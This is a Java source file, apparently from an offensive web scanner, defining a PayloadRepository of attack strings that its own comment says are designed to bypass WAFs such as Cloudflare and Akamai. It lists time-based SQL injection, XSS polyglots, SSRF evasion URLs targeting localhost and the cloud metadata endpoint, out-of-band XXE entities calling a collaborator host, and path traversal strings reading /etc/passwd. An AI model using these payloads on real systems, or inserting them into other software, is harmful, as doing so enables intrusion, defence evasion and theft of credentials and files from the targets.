package icarus.modules;

import java.util.Arrays;
import java.util.List;

/**
 * PayloadRepository stores evasive, polyglot payloads designed to bypass modern WAFs (Cloudflare, Akamai).
 * Migrated from legacy config strings.
 * Includes Canary Probes for lightweight fuzzing before heavy polyglots.
 */
public class PayloadRepository {

    public static final List<String> CANARY_PROBES = Arrays.asList(
        "corp_probe_123'\"",
        "corp_probe_<>"
    );

    public static final List<String> SQLI_TIME = Arrays.asList(
        "'/*//*/oR/*//*/1/*//*/=/*//*/1--",
        "' OR (SELECT * FROM (SELECT(SLEEP(10-(IF(1=1,0,10)))))a)--",
        "'; SELECT pg_sleep(CAST(version() LIKE 'PostgreSQL%' AS integer) * 10)--",
        "1' WAITFOR DELAY '0:0:10'--\n1' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--\n1'; SELECT pg_sleep(10)--"
    );

    public static final List<String> XSS_POLYGLOT = Arrays.asList(
        "<svg/onmouseover=\"confirm(1)\"/class=\"x\">",
        "<details/open/ontoggle=prompt(1)>",
        "'\">><script>/*<svg/onload=confirm(1)>*/</script>",
        "{{$on.constructor('alert(1)')()}}"
    );

    public static final List<String> SSRF_EVASION = Arrays.asList(
        "http://2130706433/",
        "http://0177.0.0.1/",
        "http://0x7f.0.0.1/",
        "http://169.254.169.254.nip.io/latest/meta-data/",
        "http://[::ffff:169.254.169.254]/",
        "http://google.com@127.0.0.1/"
    );

    public static final List<String> XXE_OOB = Arrays.asList(
        "<?xml version=\"1.0\" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://{COLLABORATOR_PAYLOAD}\">\n%ext;\n]>\n<root/>",
        "<!DOCTYPE root [\n<!ENTITY \n  xxe \n  SYSTEM \n  \"http://{COLLABORATOR_PAYLOAD}\" >]>"
    );

    public static final List<String> PATH_TRAVERSAL = Arrays.asList(
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//etc//passwd",
        "/%5C../%5C../%5C../%5C../etc/passwd"
    );
}
